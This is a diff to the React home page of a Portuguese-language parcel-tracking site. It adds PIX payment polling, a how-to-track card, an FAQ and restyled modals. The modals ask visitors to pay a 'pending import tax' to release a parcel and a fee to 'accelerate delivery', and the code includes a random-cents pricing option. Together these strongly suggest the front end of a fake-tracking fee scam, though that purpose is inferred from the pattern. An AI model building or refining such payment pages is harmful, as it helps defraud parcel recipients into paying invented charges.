@@ -27,6 +27,52 @@ const Home: React.FC = () => {
     const [taxPixData, setTaxPixData] = useState<any>(null);
     const [taxPixPaid, setTaxPixPaid] = useState(false);
 
+    // Polling de pagamento PIX (Taxa)
+    useEffect(() => {
+        let interval: any;
+        if (showTaxModal && taxPixData && !taxPixPaid) {
+            interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${API_BASE}/api/pix/status/${taxPixData.id || taxPixData.payment_id}?codigo=${trackResult?.codigo || ''}`);
+                    const data = await res.json();
+
+                    if (data.success && (data.status === 'PAID' || data.status === 'CONFIRMED' || data.data?.status === 'PAID' || data.data?.status === 'completed')) {
+                        setTaxPixPaid(true);
+                        clearInterval(interval);
+                        // Atualizar dados do rastreio após 2 segundos para mostrar a nova etapa
+                        setTimeout(() => {
+                            if ((window as any).handleTrackGlobal) (window as any).handleTrackGlobal();
+                        }, 2000);
+                    }
+                } catch (e) {
+                    console.error('Erro ao verificar status do PIX:', e);
+                }
+            }, 5000);
+        }
+        return () => clearInterval(interval);
+    }, [showTaxModal, taxPixData, taxPixPaid, trackResult?.codigo]);
+
+    // Polling de pagamento PIX (Acelerar/Express)
+    useEffect(() => {
+        let interval: any;
+        if (showExpressModal && pixData && !pixPaid) {
+            interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${API_BASE}/api/pix/status/${pixData.id || pixData.payment_id}?codigo=${trackResult?.codigo || ''}`);
+                    const json = await res.json();
+                    if (json && json.success && (json.status === 'PAID' || json.status === 'CONFIRMED' || json.data?.status === 'PAID' || json.data?.status === 'completed')) {
+                        setPixPaid(true);
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            if ((window as any).handleTrackGlobal) (window as any).handleTrackGlobal();
+                        }, 2000);
+                    }
+                } catch (e) { }
+            }, 5000);
+        }
+        return () => clearInterval(interval);
+    }, [showExpressModal, pixData, pixPaid, trackResult?.codigo]);
+
     // Config State
     const [useRandomCents, setUseRandomCents] = useState(true);
 
@@ -36,40 +82,6 @@ const Home: React.FC = () => {
             .then(data => setUseRandomCents(data.active))
             .catch(() => setUseRandomCents(true));
     }, []);
-
-    useEffect(() => {
-        let interval: any;
-        if (pixData && !pixPaid) {
-            interval = setInterval(async () => {
-                try {
-                    const res = await fetch(`${API_BASE}/api/pix/status/${pixData.payment_id}`);
-                    const json = await res.json();
-                    if (json && json.success && json.data?.status === 'completed') {
-                        setPixPaid(true);
-                        clearInterval(interval);
-                    }
-                } catch (e) { }
-            }, 5000);
-        }
-        return () => clearInterval(interval);
-    }, [pixData, pixPaid]);
-
-    useEffect(() => {
-        let interval: any;
-        if (taxPixData && !taxPixPaid) {
-            interval = setInterval(async () => {
-                try {
-                    const res = await fetch(`${API_BASE}/api/pix/status/${taxPixData.payment_id}`);
-                    const json = await res.json();
-                    if (json && json.success && json.data?.status === 'completed') {
-                        setTaxPixPaid(true);
-                        clearInterval(interval);
-                    }
-                } catch (e) { }
-            }, 5000);
-        }
-        return () => clearInterval(interval);
-    }, [taxPixData, taxPixPaid]);
 
     // Observer para Animação de Entrada
     useEffect(() => {
@@ -100,31 +112,33 @@ const Home: React.FC = () => {
         return () => clearInterval(timer);
     }, []);
 
-    const handleSearch = async (e: React.FormEvent) => {
-        e.preventDefault();
-        if (!codigo || !cidade) return;
+    const handleTrack = async (e?: React.FormEvent) => {
+        if (e) e.preventDefault();
         setLoading(true);
         setTrackError('');
-        setTrackResult(null);
-
         try {
-            const res = await fetch(`${API_BASE}/api/rastreio`, {
+            const res = await fetch(`${API_BASE}/api/rastreio-publico`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ codigo: codigo.toUpperCase(), cidade }),
+                body: JSON.stringify({ codigo, cidade })
             });
             const data = await res.json();
-            if (data.success && data.etapas?.length > 0) {
+            if (data.success) {
                 setTrackResult(data);
             } else {
                 setTrackError(data.message || 'Código não encontrado.');
             }
-        } catch {
-            setTrackError('Erro ao conectar com o servidor. Tente novamente mais tarde.');
+        } catch (err) {
+            setTrackError('Erro na conexão. Tente novamente.');
         } finally {
             setLoading(false);
         }
     };
+
+    // Expor handleTrack globalmente para os useEffects acima
+    useEffect(() => {
+        (window as any).handleTrackGlobal = handleTrack;
+    }, [handleTrack]);
 
     const formatDate = (dateStr: string) => {
         const d = new Date(dateStr);
@@ -580,16 +594,43 @@ const Home: React.FC = () => {
                     .metric-value { font-size: 1.6rem; }
                     .tabs-wrap { padding: 20px 16px 0; }
                     .content-section { padding: 40px 16px 60px; }
-                    .testimonials-section { padding: 60px 16px; }
-                    .site-footer { padding: 40px 16px 24px; }
-                    .footer-links-wrap { gap: 32px; }
-                    .track-submit { font-size: 0.95rem; padding: 14px; }
-                }
-                @media (max-width: 480px) {
-                    .hero-actions { flex-direction: column; }
-                    .cta-primary, .cta-secondary { justify-content: center; width: 100%; }
                     .metrics-bar { grid-template-columns: 1fr 1fr; }
                     .header-inner { padding: 12px 16px; }
+                }
+
+                .instruction-card {
+                    background: rgba(255,255,255,0.6);
+                    backdrop-filter: blur(20px);
+                    border: 1px solid rgba(255,255,255,0.8);
+                    border-radius: 24px;
+                    padding: 32px;
+                    margin-top: 40px;
+                    text-align: left;
+                    box-shadow: 0 8px 32px rgba(0, 40, 120, 0.05);
+                }
+                .instruction-step {
+                    display: flex;
+                    gap: 16px;
+                    margin-bottom: 20px;
+                }
+                .step-num {
+                    width: 32px; height: 32px;
+                    background: #0055ff;
+                    color: white;
+                    border-radius: 50%;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: 900;
+                    flex-shrink: 0;
+                    box-shadow: 0 4px 12px rgba(0, 85, 255, 0.3);
+                }
+                .faq-grid {
+                    display: grid;
+                    grid-template-columns: repeat(2, 1fr);
+                    gap: 24px;
+                    margin-top: 40px;
+                    text-align: left;
                 }
             `}</style>
 
@@ -626,7 +667,7 @@ const Home: React.FC = () => {
                         </div>
 
                         {/* Formulário de Rastreio */}
-                        <form onSubmit={handleSearch} className="track-form">
+                        <form onSubmit={handleTrack} className="track-form">
                             <div className="track-fields">
                                 <div className="track-input-wrap">
                                     <Search size={16} color="#0055ff" />
@@ -641,6 +682,51 @@ const Home: React.FC = () => {
                                 {loading ? '⏳ Buscando...' : '🔍 Rastrear agora'}
                             </button>
                         </form>
+
+                        {/* Adicionado: Instruções e FAQ na Home */}
+                        {!trackResult && (
+                            <div className="reveal reveal-delay-2">
+                                <div className="instruction-card">
+                                    <h3 style={{ fontSize: '1.25rem', fontWeight: 900, marginBottom: '24px', color: 'var(--text-primary)', display: 'flex', alignItems: 'center', gap: '10px' }}>
+                                        <Package size={22} color="#0055ff" /> Como rastrear sua encomenda
+                                    </h3>
+                                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '20px' }}>
+                                        <div className="instruction-step">
+                                            <div className="step-num">1</div>
+                                            <div style={{ fontSize: '0.85rem' }}>
+                                                <div style={{ fontWeight: 800 }}>Pegue seu código</div>
+                                                <div style={{ color: 'var(--text-secondary)' }}>No seu e-mail ou SMS.</div>
+                                            </div>
+                                        </div>
+                                        <div className="instruction-step">
+                                            <div className="step-num">2</div>
+                                            <div style={{ fontSize: '0.85rem' }}>
+                                                <div style={{ fontWeight: 800 }}>Insira o código</div>
+                                                <div style={{ color: 'var(--text-secondary)' }}>No campo de busca acima.</div>
+                                            </div>
+                                        </div>
+                                        <div className="instruction-step">
+                                            <div className="step-num">3</div>
+                                            <div style={{ fontSize: '0.85rem' }}>
+                                                <div style={{ fontWeight: 800 }}>Sua cidade</div>
+                                                <div style={{ color: 'var(--text-secondary)' }}>Para sua segurança.</div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div className="faq-grid">
+                                    <div style={{ background: 'rgba(255,255,255,0.4)', padding: '20px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.5)' }}>
+                                        <div style={{ color: '#0055ff', fontWeight: 800, fontSize: '0.85rem', marginBottom: '4px' }}>Onde encontro meu código?</div>
+                                        <div style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>Enviado pela loja via E-mail após a postagem.</div>
+                                    </div>
+                                    <div style={{ background: 'rgba(255,255,255,0.4)', padding: '20px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.5)' }}>
+                                        <div style={{ color: '#0055ff', fontWeight: 800, fontSize: '0.85rem', marginBottom: '4px' }}>O que é Taxa Pendente?</div>
+                                        <div style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>Tributos necessários para a liberação fiscal.</div>
+                                    </div>
+                                </div>
+                            </div>
+                        )}
                     </div>{/* fim hero-glass-card */}
                 </div>
 
@@ -875,13 +961,13 @@ const Home: React.FC = () => {
 
             {/* Modal Acelerar */}
             {showExpressModal && (
-                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }}>
-                    <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
+                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,20,60,0.5)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }}>
+                    <div style={{ background: 'rgba(255,255,255,0.95)', backdropFilter: 'blur(24px)', border: '1px solid rgba(0,85,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,40,120,0.15)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
                         <div style={{ width: '80px', height: '80px', background: 'rgba(99, 102, 241, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                             <Zap size={40} color="#0055ff" />
                         </div>
-                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Acelerar Entrega</h2>
-                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
+                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628' }}>Acelerar Entrega</h2>
+                        <p style={{ color: '#64748b', lineHeight: 1.6, marginBottom: '32px' }}>
                             Ao acelerar, seu pacote ganha prioridade máxima em nossa malha e será entregue em até <strong>3 dias úteis</strong>.
                         </p>
 
@@ -917,18 +1003,18 @@ const Home: React.FC = () => {
                         )}
 
                         {pixData && !pixPaid && (
-                            <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
+                            <div style={{ background: 'rgba(0,85,255,0.04)', border: '1px solid rgba(0,85,255,0.1)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                 <div style={{ fontSize: '0.8rem', color: '#0055ff', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pague via PIX</div>
-                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>
+                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#0a1628', marginBottom: '16px' }}>
                                     R$ {pixData.amount ? pixData.amount.toFixed(2).replace('.', ',') : '29,90'}
                                 </div>
                                 <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                     <img src={pixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                 </div>
-                                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all' }}>
+                                <div style={{ background: 'rgba(0,85,255,0.04)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: '#64748b', marginBottom: '10px', userSelect: 'all', border: '1px solid rgba(0,85,255,0.08)' }}>
                                     {pixData.qr_code}
                                 </div>
-                                <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
+                                <p style={{ fontSize: '0.85rem', color: '#94a3b8', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                 <button onClick={() => { navigator.clipboard.writeText(pixData.qr_code); alert('Copiado!'); }} style={{ padding: '8px 16px', background: '#4f46e5', border: 'none', borderRadius: '8px', color: 'white', cursor: 'pointer', fontSize: '0.9rem' }}>Copiar Código</button>
                                 <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                             </div>
@@ -938,23 +1024,23 @@ const Home: React.FC = () => {
                             <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                 <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                 <div style={{ fontSize: '1.2rem', color: '#10b981', fontWeight: 800 }}>Pagamento Confirmado!</div>
-                                <p style={{ fontSize: '0.9rem', color: 'rgba(255,255,255,0.7)', marginTop: '8px' }}>Seu processo de aceleração foi ativado. Você receberá atualizações em breve.</p>
+                                <p style={{ fontSize: '0.9rem', color: '#64748b', marginTop: '8px' }}>Seu processo de aceleração foi ativado. Você receberá atualizações em breve.</p>
                             </div>
                         )}
 
-                        <button onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{pixPaid ? 'Fechar' : 'Talvez mais tarde'}</button>
+                        <button onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }} style={{ background: 'none', border: 'none', color: '#94a3b8', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{pixPaid ? 'Fechar' : 'Talvez mais tarde'}</button>
                     </div>
                 </div>
             )}
             {/* Modal Taxa */}
             {showTaxModal && trackResult?.taxa_valor && (
-                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); }}>
-                    <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
+                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,20,60,0.5)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); }}>
+                    <div style={{ background: 'rgba(255,255,255,0.95)', backdropFilter: 'blur(24px)', border: '1px solid rgba(0,85,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,40,120,0.15)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
                         <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                             <Calculator size={40} color="#ef4444" />
                         </div>
-                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Pagar Taxa</h2>
-                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
+                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628' }}>Pagar Taxa</h2>
+                        <p style={{ color: '#64748b', lineHeight: 1.6, marginBottom: '32px' }}>
                             Para liberar seu pacote do centro de fiscalização, realize o pagamento da taxa de importação de <strong>R$ {trackResult.taxa_valor}</strong>.
                         </p>
 
@@ -995,18 +1081,18 @@ const Home: React.FC = () => {
                         )}
 
                         {taxPixData && !taxPixPaid && (
-                            <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
+                            <div style={{ background: 'rgba(239,68,68,0.04)', border: '1px solid rgba(239,68,68,0.1)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                 <div style={{ fontSize: '0.8rem', color: '#ef4444', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pix Copia e Cola</div>
-                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>
+                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#0a1628', marginBottom: '16px' }}>
                                     R$ {taxPixData.amount ? taxPixData.amount.toFixed(2).replace('.', ',') : trackResult.taxa_valor}
                                 </div>
                                 <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                     <img src={taxPixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                 </div>
-                                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all' }}>
+                                <div style={{ background: 'rgba(239,68,68,0.04)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: '#64748b', marginBottom: '10px', userSelect: 'all', border: '1px solid rgba(239,68,68,0.08)' }}>
                                     {taxPixData.qr_code}
                                 </div>
-                                <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
+                                <p style={{ fontSize: '0.85rem', color: '#94a3b8', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                 <button onClick={() => { navigator.clipboard.writeText(taxPixData.qr_code); alert('Copiado!'); }} style={{ padding: '8px 16px', background: '#ef4444', border: 'none', borderRadius: '8px', color: 'white', cursor: 'pointer', fontSize: '0.9rem' }}>Copiar Código</button>
                                 <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                             </div>
@@ -1016,11 +1102,11 @@ const Home: React.FC = () => {
                             <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                 <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                 <div style={{ fontSize: '1.2rem', color: '#10b981', fontWeight: 800 }}>Pagamento Confirmado!</div>
-                                <p style={{ fontSize: '0.9rem', color: 'rgba(255,255,255,0.7)', marginTop: '8px' }}>Sua taxa foi paga com sucesso. O pacote será liberado em breve.</p>
+                                <p style={{ fontSize: '0.9rem', color: '#64748b', marginTop: '8px' }}>Sua taxa foi paga com sucesso. O pacote será liberado em breve.</p>
                             </div>
                         )}
 
-                        <button onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{taxPixPaid ? 'Fechar' : 'Voltar'}</button>
+                        <button onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); }} style={{ background: 'none', border: 'none', color: '#94a3b8', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{taxPixPaid ? 'Fechar' : 'Voltar'}</button>
                     </div>
                 </div>
             )}
